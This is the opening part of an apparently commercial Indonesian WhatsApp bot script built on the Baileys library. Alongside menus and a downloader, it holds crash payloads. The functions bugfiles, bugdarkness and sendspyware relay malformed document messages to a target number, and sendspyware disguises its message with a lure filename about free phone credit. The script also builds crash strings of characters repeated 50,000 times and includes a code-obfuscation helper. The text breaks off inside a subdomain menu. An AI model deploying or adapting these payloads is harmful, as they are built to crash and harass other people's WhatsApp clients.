/*SC INI DI JUAL RESMI OLEH ALWAYSAQIO

HAK GUNA PEMBELI
1.MENGGUNAKAN
2.TIDAK MELAKUKAN RENAME/RECODE
3.TIDAK MENJUALNYA TANPA IZIN aPEMILIK
4.MALANGGAR 3 KETENTUAN DI ATAS ? SANGSINYA TENGGUNG SENDIRI AJA

BASE : ALWAYSAQIO
CREATE : ALWAYSAQIO

TELEGRAM : t.me/alwaysaqioo
YT : youtube.com/qioaje
IG : instagram.com/Alwaysaqioo
*/

require('./settings')
require('./lib/language')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeInMemoryStore, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = global.baileys1
const path = require('path');
const cron = require('node-cron');
const fs = require('fs')
const util = require('util')
const jimp = require("jimp")
const chalk = require('chalk')
const { say } = require('cfonts')
const os = require('os')
const { Deobfuscator } = require("deobfuscator");
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const jsobfus = require('javascript-obfuscator')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const timestampp = speed();
const latensi = speed() - timestampp
const moment = require('moment-timezone')
const usePairingCode = true
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const NodeCache = require("node-cache")
const resolveMsgBuffer = new NodeCache()
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const { JSDOM } = require('jsdom')
module.exports = qio = async (qio, m, chatUpdate, store) => {
  try {
    var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.msg.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''


    var budy = (typeof m.text == 'string' ? m.text : '')
    var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
    const isCmd = body.startsWith(prefix)
    const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const botNumber = await qio.decodeJid(qio.user.id)
    const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const orgkaya = JSON.parse(fs.readFileSync('./owner.json'))
    const kontributor = JSON.parse(fs.readFileSync('./owner.json'))
    const { buk1000, buk2000, buk3000, buk4000, ipbug } = require("./lib/instastalk.js")
    const iniseller = JSON.parse(fs.readFileSync('./lib/seller.json'))
    const premium = JSON.parse(fs.readFileSync('./lib/premium.json'))
    const inimurbug = JSON.parse(fs.readFileSync('./lib/murbug.json'))
    const contacts = JSON.parse(fs.readFileSync("./lib/contacts.json"))
    const isContacts = contacts.includes(m.sender)
    const isReseller = [botNumber, ...iniseller, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const isDeveloper = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const isMurbug = [botNumber, ...inimurbug, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const isPrem = [botNumber, ...premium, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
    const qtext = q = args.join(" ")
    const quoted = m.quoted ? m.quoted : m
    const from = mek.key.remoteJid
    const { spawn: spawn, exec } = require('child_process')
    const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
    const groupMetadata = m.isGroup ? await qio.groupMetadata(from).catch(e => { }) : ''
    const participants = m.isGroup ? await groupMetadata.participants : ''
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    const isGroup = m.chat.endsWith('@g.us')
    const groupOwner = m.isGroup ? groupMetadata.owner : ''
    const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
    const pushname = m.pushName || "No Name"
    const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
    const qioimage = fs.readFileSync('./lib/#Alwaysaqioo/qio.jpg')
    const banner = fs.readFileSync('./lib/#Alwaysaqioo/banner.jpg')
    const qioscript = fs.readFileSync('./lib/#Alwaysaqioo/qioscript.jpg')
    const mime = (quoted.msg || quoted).mimetype || ''
    const { uptotelegra } = require('./lib/upload')
    const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
    const virgam = fs.readFileSync('./lib/#Alwaysaqioo/virgam.jpeg')
    const { typeNullQio } = require("./lib/main.js")
    const slayer = fs.readFileSync('./lib/#Alwaysaqioo/slayer07.jpg')
    const santet = fs.readFileSync('./lib/#Alwaysaqioo/santet.jpg')
    const buyprem = fs.readFileSync('./lib/Meywings/buyprem.jpg')
    const sendbug = fs.readFileSync('./lib/Meywings/sendbug.jpg')
    const loading = fs.readFileSync('./lib/Meywings/loading.jpg')
    const ytdl = require("ytdl-core")
    const bugthumb = fs.readFileSync('./lib/#Alwaysaqioo/virgam.jpeg')
    const agency = '© QioDev'
    const mediabug = { url: "./lib/#Alwaysaqi0o/bug1.mp4" }
    const { startbot, stopjadibot } = require('./lib/start')
    global.nick = {
      aaa: "🧷𝔄𝔩𝔴𝔞𝔶𝔰𝔞𝔮𝔦𝔬𝔬 المطور‌‌‌‌‌‌‏",
      sss: "𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎"
    }
    async function Decrypt(query) {
      const deobfuscatedCode = new Deobfuscator();
      return deobfuscatedCode.deobfuscateSource(query);
    }
    const banirvo = `Eu quero comprar seus órgãos, senhor` + `†½` + "꙰̷̸̷࣭࣭࣭࣭࣭⃜⃜⃜⃜⃜⃜⃜⃜ꢁꠥꠋ꠆ꦾ⃍⃤⃖⃖⃡⃩௅݉ꦾ aplicativo ruim do whatsapp☠️,".repeat(50000)
    const buttonqio = `💯` + "ꦾ".repeat(50000)
    const responbug = 'bug is being sent🍻'
    const ownerprem = 'miskin amat cik, minimal buy prem sono'
    const idsalurangw = '120363293409799965@newsletter'
    const idsaluranwa = '120363144038483540@newsletter'
    const idsaluranmark = '120363151921302028@newsletter'
    const yutubgua = 'https://youtube.com/@qioaje'
    const reaction = async (jidss, emoji) => {
      qio.sendMessage(jidss, {
        react: {
          text: emoji,
          key: m.key
        }
      })
    }


    const fileSizes = ["1073741824", "1024", "1125899906842624", "1099511627776", "0"];
    const randomFileSize = fileSizes[Math.floor(Math.random() * fileSizes.length)];


    let [peenis, pepekk = "200"] = q.split("|")
    let target = peenis.replace(/[^0-9]/g, '').trim()
    let {
      default: makeWaSocket,
      useMultiFileAuthState,
      fetchLatestBaileysVersion
    } = require('@whiskeysockets/baileys')
    let {
      state
    } = await useMultiFileAuthState('Alwaysaqioooo')
    let {
      version
    } = await fetchLatestBaileysVersion()
    let sucked = await makeWaSocket({
      auth: state,
      browser: ['Mac Os', 'chrome', '121.0.6167.159'],
      version: [2, 2413, 1],
      keepAliveIntervalMs: 50000,
      printQRInTerminal: !usePairingCode,
      generateHighQualityLinkPreview: true,
      resolveMsgBuffer,
      logger: pino({ level: "silent" }),
      level: 'fatal'
    })


    /*		const result = isGroupChat(m.chat);
      	
    function isGroupChat(isGroupChat) {
        return jid.endsWith('@g.us');
    }
        	
        function checkJidEndsWith(jid, suffix) {
            // Cek apakah jid adalah string
            if (typeof jid !== 'string') {
                throw new TypeError('jid must be a string');
            }
            // Kembalikan hasil endsWith
            return jid.endsWith(suffix);
        }
        */

    let resize = async (image, width, height) => {
      let oyy = await jimp.read(image)
      let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
      return kiyomasa
    }



    const context = { resize, qioimage }


    const qvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        "audioMessage": {
          "mimetype": "audio/ogg; codecs=opus",
          "seconds": 359996400,
          "ptt": "true"
        }
      }
    }

    const ftext = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? {
          remoteJid: "status@broadcast"
        } : {})
      },
      message: {
        "extendedTextMessage": {
          "text": `🖥️༐✲ 𝐌𝐬𝐠 𒑊 ${m.body || m.mtype}`,
          "title": `Alwaysaqioo`,
          'jpegThumbnail': qioscript,
        }
      }
    }

    let ucapanWaktu
    if (time >= "19:00:00" && time < "23:59:00") {
      ucapanWaktu = "🌃 Selamat Malam"
    } else if (time >= "15:00:00" && time < "19:00:00") {
      ucapanWaktu = "🌄 Selamat Sore"
    } else if (time >= "11:00:00" && time < "15:00:00") {
      ucapanWaktu = "🏞️ Selamat Siang"
    } else if (time >= "06:00:00" && time < "11:00:00") {
      ucapanWaktu = "🏙️ Selamat Pagi"
    } else {
      ucapanWaktu = "🌆 Selamat Subuh"
    }

    async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query,
            {
              compact: false,
              controlFlowFlattening: true,
              controlFlowFlatteningThreshold: 1,
              numbersToExpressions: true,
              simplify: true,
              stringArrayShuffle: true,
              splitStrings: true,
              stringArrayThreshold: 1
            }
          );
          const result = {
            status: 200,
            author: `Me`,
            result: obfuscationResult.getObfuscatedCode()
          }
          resolve(result)
        } catch (e) {
          reject(e)
        }
      })
    }
    // Hahahaha
    if (!qio.public) {
      if (!isCreator) return
    }

    if (command) {
      console.log('\x1b[30m--------------------\x1b[0m');
      console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
      console.log(
        chalk.bgHex("#00FF00").black(
          `   <✓> Date: ${new Date().toLocaleString()} \n` +
          `   <✓> Message: ${m.body || m.mtype} \n` +
          `   <✓> Sender: ${m.pushName} \n` +
          `   <✓> JID: ${m.sender}`
        )
      );
      if (m.isGroup) {
        console.log(
          chalk.bgHex("#00FF00").black(
            `   <✓> Sender: ${m.pushName} \n` +
            `   <✓> GroupJid: ${m.chat}`
          )
        );
      }
      console.log();
    }

    let rn = ['recording']
    let jd = rn[Math.floor(Math.random() * rn.length)];
    if (m.message) {
      qio.sendPresenceUpdate(jd, from)
    }

    async function loadbug() {
      var qioloading = [
        "▓▓",
        "▓▓▓",
        "▓▓▓▓",
        "▒▒▒",
        "▒▒",
        "▒",
        "𝘧𝘪𝘯𝘪𝘴𝘩𝘦𝘥"
      ]
      let { key } = await qio.sendMessage(from, { text: '▓' })
      for (let i = 0; i < qioloading.length; i++) {
        await qio.sendMessage(from, { text: qioloading[i], edit: key });
      }
    }

    async function mennuu() {
      var qioloading = [
        `¹`,
        `²`,
        `³`,
        `⁴`
      ]
      let { key } = await qio.sendMessage(from, { text: '⚠️danger\nCrash In Count' })
      for (let i = 0; i < qioloading.length; i++) {
        await qio.sendMessage(from, { text: qioloading[i], edit: key });
      }
    }

    async function lokasbug() {
      let pepec = q.replace(/[^0-9]/g, "")
      let Pe = pepec + '@s.whatsapp.net'
      var qioloading = [
        `Sending Bugs...\n\nStatus : Sucess\nTarget : ${Pe}\nJenis Bug : ${command}\nVersion Bot : Qioo V18 Pro\nDeveloped : Alwaysaqioo\nYouTube : @qioaje\nTelegram : @Alwaysaqioo\n\n*Jeda 5 Menit Klo gx Delete Prem+Blok*`
      ]
      let { key } = await qio.sendMessage(from, { text: `Sending Bugs...\n\nStatus : Pending\n\nTarget : ${Pe}\nJenis Bug : ${command}\nVersion Bot : Qioo V18 Pro\nDeveloped : Alwaysaqioo\nYouTube : @qioaje\nTelegram : @Alwaysaqioo` })
      await sleep(1000)
      for (let i = 0; i < qioloading.length; i++) {
        await qio.sendMessage(from, { text: qioloading[i], edit: key });
      }
    }

    // Function Penting

    const FileSize = (number) => {
      var SI_POSTFIXES = ["B", " KB", " MB", " GB", " TB", " PB", " EB"]
      var tier = Math.log10(Math.abs(number)) / 3 | 0
      if (tier == 0) return number
      var postfix = SI_POSTFIXES[tier]
      var scale = Math.pow(10, tier * 3)
      var scaled = number / scale
      var formatted = scaled.toFixed(1) + ''
      if (/\.0$/.test(formatted))
        formatted = formatted.substr(0, formatted.length - 2)
      return formatted + postfix
    }

    qio.sendButton = async (jid, buttons, quoted, opts = {}) => {
      let message = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: opts && opts.body ? opts.body : ''
              },
              footer: {
                text: opts && opts.footer ? opts.footer : ''
              },
              nativeFlowMessage: {
                buttons: buttons,
                messageParamsJson: ''
              }
            }
          }
        }
      }, {
        quoted
      })
      await qio.sendPresenceUpdate('composing', jid)
      return qio.relayMessage(jid, message["message"], {
        messageId: message.key.id
      })
    }



    async function bugfiles(target, m) {
      var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        "documentMessage": {
          "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          "mimetype": "penis",
          "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          "fileLength": "9999999999999999999999999",
          "pageCount": 0x9ff9ff9ff1ff8ff4ff5f,
          "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          "fileName": `𝕬𝖑𝖜𝖆𝖞𝖘𝖆𝖖𝖎𝖔𝖔 𝕮𝖗𝖆𝖘𝖍☠️`,
          "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          "mediaKeyTimestamp": "1715880173"
        }
      }), { userJid: target, quoted: m });
      await qio.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
    }

    async function bugdarkness(target, m) {
      var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        "documentMessage": {
          "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          "mimetype": "penis",
          "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          "fileLength": "9999999999999999999999999",
          "pageCount": 0x9ff9ff9ff1ff8ff4ff5f,
          "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          "fileName": `Darkness 㐅`,
          "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          "mediaKeyTimestamp": "1715880173"
        }
      }), { userJid: target, quoted: m });
      await qio.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
    }

    async function sendspyware(target, m) {
      var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
        "documentMessage": {
          "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          "mimetype": "penis",
          "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          "fileLength": "9999999999999999999999999",
          "pageCount": 0x9ff9ff9ff1ff8ff4ff5f,
          "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          "fileName": `klaim pulsa sekarang!!!`,
          "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          "mediaKeyTimestamp": "1715880173"
        }
      }), { userJid: target, quoted: m });
      await qio.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
    }
    //=================================================//
    async function replymark(txt) {
      const qiowwkk = {
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: 'Mark Zuckerberg',
            newsletterJid: idsaluranmark,
          },
          externalAdreply: {
            showAdAttribution: true,
            title: namaowner,
            body: 'Alwaysaqioo',
            thumbnailUrl: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg',
            sourceUrl: 'https://t.me/@Alwaysaqioo',
          },
        },
        text: txt,
      }
      qio.sendMessage(from, qiowwkk, {
        quoted: m,
      })
    }

    async function memekmark(txt) {
      const qiowwwkk = {
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: '⚠️𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎',
            newsletterJid: idsaluranmark,
          },
          externalAdreply: {
            showAdAttribution: true,
            title: namaowner,
            body: 'Alwaysaqioo',
            thumbnailUrl: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg',
            sourceUrl: 'https://t.me/@Alwaysaqioo',
          },
        },
        text: txt,
      }
      qio.sendMessage(from, qiowwwkk)
    }

    async function replywa(txt) {
      const qiowwkkk = {
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: 'Whatsapp',
            newsletterJid: idsaluranwa,
          },
          externalAdreply: {
            showAdAttribution: true,
            title: namaowner,
            body: 'Alwaysaqioo',
            thumbnailUrl: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg',
            sourceUrl: 'https://t.me/@Alwaysaqioo',
          },
        },
        text: txt,
      }
      qio.sendMessage(from, qiowwkkk, {
        quoted: m,
      })
    }

    const qioquotd2 = {
      key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "2024",
          thumbnail: qioscript,
          itemCount: `2024`,
          status: "INQUIRY",
          surface: "CATALOG",
          message: `⟣ Alwaysaqioo′`,
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: m.sender.split,
        forwardingScore: 99999,
        isForwarded: true
      }
    }

    async function replygw(txt) {
      const qiowwwkkk = {
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterName: 'Alwaysaqioo',
            newsletterJid: idsalurangw,
          },
          externalAdreply: {
            showAdAttribution: true,
            title: namaowner,
            body: 'Alwaysaqioo',
            thumbnailUrl: 'https://telegra.ph/file/67df6124e5ea42d98946f.jpg',
            sourceUrl: 'https://t.me/@Alwaysaqioo',
          },
        },
        text: txt,
      }
      qio.sendMessage(from, qiowwwkkk, {
        quoted: m,
      })
    }


    const downloadMp3 = async (Link) => {
      try {
        await ytdl.getInfo(Link)
        let mp3File = getRandom('.mp3')
        ytdl(Link, { filter: 'audioonly' }).pipe(fs.createWriteStream(mp3File)).on('finish', async () => {
          await qio.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
          fs.unlinkSync(`./${mp3File}`)
        })
      } catch (err) {
        m.reply(`${err}`)
      }
    }

    // Komen
    switch (command) {
      // MENU
      case '/menu': {
        capMenu = `
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Haii🖐️
🇮🇩 ~Indonesia
saya adalah robot whatsapp yang dibuat oleh Alwaysaqioo menggunakan java script, adakah yang dapat saya bantu?

🇬🇧 ~Engglish
I am a WhatsApp robot created by Alwaysaqioo using Java script, is there anything I can help you with?
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*Jika ingin berbicara dengan bot , ketik perintah*
_*ai* <pesan>_

                          !####!`

        msgii = generateWAMessageFromContent(m.chat, {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: capMenu
                }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  hasMediaAttachment: true,
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/png",
                    fileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                    jpegThumbnail: await resize(fs.readFileSync('./lib/#Alwaysaqioo/qioscript.jpg'), 400, 400),
                    fileLength: randomFileSize,
                    mediaKey: "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
                    fileName: `▢ Hiii, ${m.pushName}`,
                    directPath: "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
                    contactVcard: true,
                    mediaKeyTimestamp: "1658703206"
                  }
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
                    {
                      name: "quick_reply",
                      buttonParamsJson: "{\"display_text\":\"Menampilkan Menu\",\"id\":\".menuooo\"}"
                    },
                  ]
                }),
                contextInfo: {
                  isForwarded: false,
                  mentionedJid: [m.sender, owner + "@s.whatsapp.net"],
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: idsalurangw,
                    newsletterName: '!# ⚠️𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎'
                  },
                  externalAdReply: {
                    title: "⚠️𝑨𝒍𝒘𝒂𝒚𝒔𝒂𝒒𝒊𝒐𝒐 𝑺𝒚𝒔𝒕𝒆𝒎",
                    body: "—Alwaysaqioo V18",
                    thumbnailUrl: "https://telegra.ph/file/67df6124e5ea42d98946f.jpg",
                    thumbnail: qioscript,
                    sourceUrl: 'Dev-Qio',
                    previewType: "VIDEO",
                    showAdAttribution: true,
                    mediaType: 1,
                    renderLargerThumbnail: true
                  }
                }
              })
            }
          }
        }, { userJid: m.sender, quoted: qioquotd2 })

        await qio.relayMessage(msgii.key.remoteJid, msgii.message, {
          messageId: msgii.key.id
        })
      }
        break

      case 'menu': {
        let wek = `▬▭▬▭▬▭▬▭▬▬▭▬▭▬
╔═╗╔══╗╔═╗╔═╗
║╬║╚║║╝║║║║║║
╚╗║╔║║╗║║║║║║
─╚╝╚══╝╚═╝╚═╝
- 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊
·> 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : ${global.botname}
·> 𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : ${global.namaowner}
·> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : Qioo V18
·> 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : Alwaysaqioo
·> 𝐒𝐩𝐞𝐞𝐝 : ${speed()} miliseconds
·> 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${runtime(process.uptime())}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
- 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊
·> 𝐍𝐚𝐦𝐞 : ${m.pushName}
·> 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : ${isPrem ? '✅' : `❌`}
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
╔─═─═─═─═─═─═─⬣
║*Jika ingin berbicara dengan bot , ketik perintah*
║_*ai* <pesan>_
┗━━━━━━━━━━━━━━━━━━⬣
╔─═─═─═─═─═─═─⬣
║➢ bugmenu
║➢ anonimmenu
║➢ panelmenu
║➢ subdomainmenu
║➢ aksesmenu
║➢ soundmenu
║➢ groupmenu
║➢ gamemenu
║➢ stickermenu
║➢ downloadmenu
║➢ toolsmenu
║➢ lacakresimenu
║➢ asupanmenu
║➢ ownermenu
║➢ txtmenu
║➢ infobot
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
        qio.sendMessage(from, { image: qioscript, caption: wek, quoted: qvn })
      }
        break

      case "/panelmenu": {
        async function menu() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ delsrv *id server*
║➢ delusr
║➢ addsrv *nama,tanggal,ram,15,1,0/0,0*
║➢ listram
║➢ listsrv
║➢ listusr
┗━━━━━━━━━━━━━━━━━━⬣
│𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : @Alwaysaqioo
│𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : @Wangcap
┗━━━━━━━━━━━━━━━━━━⬣`
          ]
          let { key } = await qio.sendMessage(from, { text: '𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨' })
          for (let i = 0; i < qioloading.length; i++) {
            await qio.sendMessage(from, { text: qioloading[i], edit: key });
          }
        }
        await menu()
        await reaction(from, "☠️")
      }
        break

      case "/subdomainmenu": {
        async function domen() {
          var qioloading = [
            `𝐍𝐨`,
            `𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫`,
            `*display ${command}*`,
            `╔─═─═─═─═─═─═─⬣
║➢ d1 kedai-panel.my.id
║➢ d2 mypanell.biz.id
║➢ d3 piwzstoreee.my.id
║➢ d4 piwzpediaaa.biz.id
║➢ d5 piwzpanel.me
║➢ d6 r0ulxye4.my.id
║➢ d7 lanzpanel.my.id
║➢ d8 cpanel-vip.my.id (khusus cpanel)
║➢ d9 panelstore.art
║➢ d10 panelmurah.cfd
║➢ d11 panelprivv.xyz
║➢ d12 tokopanellku.my.id
║➢ d13 kiospanell.my.id
║➢ d14 moon-offc.my.id
║➢ d15 moon-ooffc.biz.id
║➢ d16 panellstore.site
║➢ d17 tokopanellmurah.my.id
║➢ d18 bisnispanel.my.id
║➢ d19 xmartpanel.my.id
║➢ d20 tokopanel.biz.id
║➢ d21 store-panel.biz.id
║➢ d22 sellerpanel.biz.id
║➢ d23 panellprivate.my.id
║➢ d24 mypanel.my.id
║➢ d25 kangpanel.biz.id
║➢ d26 jasapanel.my.id
║➢ d27 dewapanel.my.id
║➢ d28 adminpanel.biz.id
║➢ d29 plerkuda.my.id
║➢ d30 cafegt.my.id
║➢ d31 dmdpanel.my.id
║➢ d32 storemurah.my.id
║➢ d33 shopwebsite.my.id
║➢ d34 market-software.my.id
║➢ d35 panel-digital.my.id
║➢ d36 acrp.my.id
